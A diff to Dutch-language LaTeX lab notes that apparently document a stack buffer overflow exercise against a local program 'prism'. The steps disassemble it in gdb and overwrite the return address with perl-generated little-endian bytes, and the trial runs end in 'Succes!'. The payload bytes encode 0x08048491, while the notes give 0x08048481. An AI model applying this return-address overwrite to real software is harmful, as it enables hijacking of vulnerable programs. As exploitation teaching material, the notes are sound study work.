@@ -1,5 +1,5 @@
 \begin{enumerate}
-  \item gcc -g -fno-stack-protector -z execstack -o prism prism.c
+  \item gcc-3.3 -o prism prism.c
   \item gdb -q prism 
   \item (gdb) list
   	\begin{enumerate}
@@ -17,8 +17,29 @@
   	\item Disassembly taal naar intel zetten
   	\end{enumerate}
   \item disass gegevens
-  
-  
+  	\begin{enumerate}
+  	\item 0x08048481
+  	\item Dit adres moet het return-adres van de main functie overschrijven
+  		\begin{enumerate}
+  		\item Let op: Little Endian
+  		\end{enumerate}
+  	\end{enumerate}
+  \item Trial and error
+  	\begin{enumerate}
+  	\item (gdb) run ``\$(perl -e `print ``\textbackslash{}x91\textbackslash{}x84\textbackslash{}x04\textbackslash{}x08''x2')''
+  		\begin{enumerate}
+  		\item Program exited normally
+  		\end{enumerate}
+  	\item (gdb) run ``\$(perl -e `print ``\textbackslash{}x91\textbackslash{}x84\textbackslash{}x04\textbackslash{}x08''x3')''
+  		\begin{enumerate}
+  		\item Segmentation fault
+  		\end{enumerate}
+  	\item (gdb) run ``\$(perl -e `print ``\textbackslash{}x91\textbackslash{}x84\textbackslash{}x04\textbackslash{}x08''x4')''
+  		\begin{enumerate}
+  		\item Succes!
+  		\end{enumerate}
+  	\end{enumerate}
+  \item ./prism ``\$(perl -e `print ``\textbackslash{}x91\textbackslash{}x84\textbackslash{}x04\textbackslash{}x08''x4')''
 \end{enumerate}
 
 \begin{lstlisting}
